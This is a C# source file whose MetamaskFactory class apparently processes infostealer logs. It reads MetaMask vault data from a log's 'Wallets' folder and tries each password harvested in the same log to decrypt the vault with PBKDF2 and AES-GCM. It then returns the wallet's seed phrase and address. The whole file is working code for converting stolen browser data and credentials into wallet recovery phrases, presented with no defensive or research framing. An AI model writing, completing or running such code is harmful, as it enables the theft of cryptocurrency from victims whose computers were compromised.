using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using Core.Models.Abstractions;
using Core.Models.Realizations;
using Newtonsoft.Json;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;

namespace Core.Models.Factories;

public class MetamaskFactory : IWalletsFactory<WalletMetamask>
{
    private static readonly Regex r_vault = new("\"vault\":\"({\"data\":\".*?\",\"iv\":\".*?\",\"salt\":\".*?\"})\"");
    private static readonly Regex r_address = new("\"CachedBalancesController\":{\"cachedBalances\":{\".*?x.*?\":{\"(.*?)\":\".*?x.*?\"},\"");
    
    public async IAsyncEnumerable<WalletMetamask> Create(ILog log)
    {
        if (!log.HasWallets)
        {
            yield break;
        }

        IEnumerable<string> files =
            Directory.GetDirectories(Path.Combine(log.Path, "Wallets"))
                .SelectMany(x => Directory.GetFiles(x, "*.log"));

        foreach (var file in files)
        {
            var data = (await File.ReadAllTextAsync(file)).Replace(@"\", "");
            var vault = await ParseVault(data);

            if (vault == null)
            {
                continue;
            }

            await foreach (var password in log.Passwords.Select(x => x.Password))
            {
                var decrypted = DecryptVault(password, vault);

                if (decrypted == null)
                {
                    continue;
                }

                var json = (dynamic) JsonConvert.DeserializeObject(decrypted)!;
                string mnemonic;

                try
                {
                    mnemonic = Encoding.UTF8.GetString(
                        JsonConvert.DeserializeObject<byte[]>(
                            (string)json[0].data.mnemonic.ToString()
                        )!
                    );
                }
                catch
                {
                    continue;
                }
                
                yield return new WalletMetamask
                {
                    Log = file,
                    Mnemonic = mnemonic,
                    Address = await ParseAddress(data) ?? string.Empty
                };
                
                break;
            }
        }
    }
    
    #region Mnemonic
    
    private static Task<Vault?> ParseVault(string data)
    {
        var match = r_vault.Match(data);

        return Task.FromResult(
            match.Success
                ? JsonConvert.DeserializeObject<Vault>(match.Groups[1].Value)
                : null
        );
    }
    
    private static byte[] KeyFromPassword(string password, string salt)
    {
        byte[] derivedKey;
        
        var buf_password = Encoding.UTF8.GetBytes(password);
        var buf_salt = Convert.FromBase64String(salt);

        using (Rfc2898DeriveBytes pbkdf2 = new Rfc2898DeriveBytes(
                   buf_password, 
                   buf_salt,
                   10000, 
                   HashAlgorithmName.SHA256))
        {
            derivedKey = pbkdf2.GetBytes(32);
        }
        
        return derivedKey;
    }

    private static string? DecryptVault(string password, Vault vault)
    {
        byte[] decrypted;
        
        var key = KeyFromPassword(password, vault.Salt);
        var buf_data = Convert.FromBase64String(vault.Data);
        var buf_iv = Convert.FromBase64String(vault.Iv);
        
        GcmBlockCipher cipher = new(new AesEngine());
        ICipherParameters parameters = new AeadParameters(new KeyParameter(key), 128, buf_iv, null);
        
        try
        {
            cipher.Init(false, parameters);
            decrypted = new byte[cipher.GetOutputSize(buf_data.Length)];
            int retLen = cipher.ProcessBytes(buf_data, 0, buf_data.Length, decrypted, 0);
            cipher.DoFinal(decrypted, retLen);
        }
        catch
        {
            return null;
        }
        
        return Encoding.UTF8.GetString(decrypted);
    }
    
    #endregion

    #region Address

    private static Task<string?> ParseAddress(string data)
    {
        var match = r_address.Match(data);
        
        return Task.FromResult(
            match.Success
                ? match.Groups[1].Value
                : null
        );
    }
    
    #endregion
}